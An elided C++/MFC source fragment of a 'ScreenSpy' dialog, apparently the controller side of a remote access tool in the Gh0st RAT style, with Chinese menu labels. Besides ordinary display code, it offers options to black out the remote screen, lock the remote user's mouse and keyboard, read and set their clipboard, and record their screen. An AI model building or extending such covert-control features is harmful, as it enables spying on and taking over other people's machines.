...
enum
{
	...
	IDM_AERO_DISABLE,		// 禁用Aero
	IDM_AERO_ENABLE,		// 启用Aero
	IDM_QUALITY75,		// 清晰度中
	IDM_QUALITY30,		// 清晰度低
	IDM_QUALITY100,		// 清晰度高
...
void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	...
	GetScrollBarInfo(OBJID_VSCROLL, &sbiv);
	GetScrollBarInfo(OBJID_HSCROLL, &sbih);
	...
	else
	{
		...
		GetScrollBarInfo(OBJID_HSCROLL, &sbit);//m_hWnd, 
...
void CScreenSpyDlg::OnClose()
{
	__try
	{
		...
		//m_iocpServer->Disconnect(m_pContext->dwConnID);
...
void CScreenSpyDlg::OnReceive()
{
	...
	str.Format(_T("IP : %s 接收: %.2f kb/s [%d * %d] FPS[%d] %d%% "), m_IPAddress, (float)(m_pContext->m_CompressionBuffer.GetBufferLen() / 1024),
		m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_nFramesPerSecond, m_pContext->m_nTransferProgress);
...
BOOL CScreenSpyDlg::OnInitDialog()
{
	...
	if (pSysMenu != NULL)
	{
		...
		pSysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "全屏(F11退出)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "绘制全屏幕");
		pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, "窗口置顶");
		pSysMenu->AppendMenu(MF_STRING, IDM_CTRL_ALT_DEL, "发送Ctrl+Alt+Del");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪鼠标");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定鼠标和键盘");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴");
		pSysMenu->AppendMenu(MF_SEPARATOR);

		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_DISABLE, "禁用Aero");
		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_ENABLE, "启用Aero");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_HOME, "办公算法(&H)");
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY30, "清晰度低");
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY75, "清晰度中");
		pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, "清晰度高");
		pSysMenu->AppendMenu(MF_SEPARATOR);

		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位");
		...
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY75, IDM_QUALITY100, IDM_QUALITY75, MF_BYCOMMAND);//默认10
	}

	// TODO: Add extra initialization here
	CString str;
	str.Format(_T("IP : %s (%d * %d)"), m_IPAddress, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
	SetWindowText(str);
...
void CScreenSpyDlg::OnPaint()
{
	...
	SetStretchBltMode(m_hCurrWndDC, /*STRETCH_HALFTONE*/HALFTONE);
	//---------------以上自适应修改-----------------------
	...
	if (m_bIsTraceCursor)
	{
		DrawIconEx(
			...
			m_LastCursorPos.x - iHScrollPos,			// x-coord of upper left corner
			m_LastCursorPos.y - iVScrollPos,			// y-coord of upper left corner
	...
	{
		LPCTSTR	lpTipsString = _T("正在录制屏幕中...");//Recording ...
		m_aviStream.Write(m_lpvLastBits);

		// 提示正在录像
		SetBkMode(m_hCurrWndDC, TRANSPARENT);
		SetTextColor(m_hCurrWndDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hCurrWndDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
}


void CScreenSpyDlg::OnSizing(UINT fwSide, LPRECT pRect)
{
...
void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	...
	break;
	case IDM_QUALITY75:  // 清晰度75
	{
		BYTE	bToken = COMMAND_UALITY75;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY75, IDM_QUALITY100, IDM_QUALITY75, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY30:  // 清晰度30
	{
		BYTE	bToken = COMMAND_UALITY30;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY75, IDM_QUALITY100, IDM_QUALITY30, MF_BYCOMMAND);
	}
	break;
	case IDM_QUALITY100:  // 清晰度100
	{
		BYTE	bToken = COMMAND_UALITY100;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		pSysMenu->CheckMenuRadioItem(IDM_QUALITY75, IDM_QUALITY100, IDM_QUALITY100, MF_BYCOMMAND);
	}
	break;
	...
	case IDM_ALGORITHM_HOME: // 家用办公算法
	{
		...
		pSysMenu->EnableMenuItem(IDM_QUALITY30, MF_ENABLED);
		pSysMenu->EnableMenuItem(IDM_QUALITY75, MF_ENABLED);
		pSysMenu->EnableMenuItem(IDM_QUALITY100, MF_ENABLED);
	...
	case IDM_ALGORITHM_XVID: // 影视娱乐算法
	{
		...
		pSysMenu->EnableMenuItem(IDM_DEEP_16, MF_ENABLED);
		pSysMenu->EnableMenuItem(IDM_QUALITY30, MF_GRAYED);
		pSysMenu->EnableMenuItem(IDM_QUALITY75, MF_GRAYED);
		pSysMenu->EnableMenuItem(IDM_QUALITY100, MF_GRAYED);
	}
	break;
	case IDM_SAVEAVI:
		SaveAvi();
	...
	{
		EnterFullScreen();
		pSysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //菜单样式
		break;
	}
	// 	case IDM_DEEP_1:
	// 		{
...
BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	...
	case WM_MOUSEWHEEL:
	{
		...
		msg.lParam = MAKELPARAM(xPos * m_lpbmi_full->bmiHeader.biWidth / rect.Width(), yPos * m_lpbmi_full->bmiHeader.biHeight / rect.Height());
		msg.pt.x = xPos * m_lpbmi_full->bmiHeader.biWidth / rect.Width();
		msg.pt.y = yPos * m_lpbmi_full->bmiHeader.biHeight / rect.Height();
		SendCommand(&msg);
...
void CScreenSpyDlg::OnMoving(UINT fwSide, LPRECT pRect)
{
...
void CScreenSpyDlg::SaveAvi()
{
	...
	if (!m_aviStream.Open(m_aviFile, m_lpbmi_full))
	{
		m_aviFile = "";
		MessageBox("创建录像文件失败");
	}
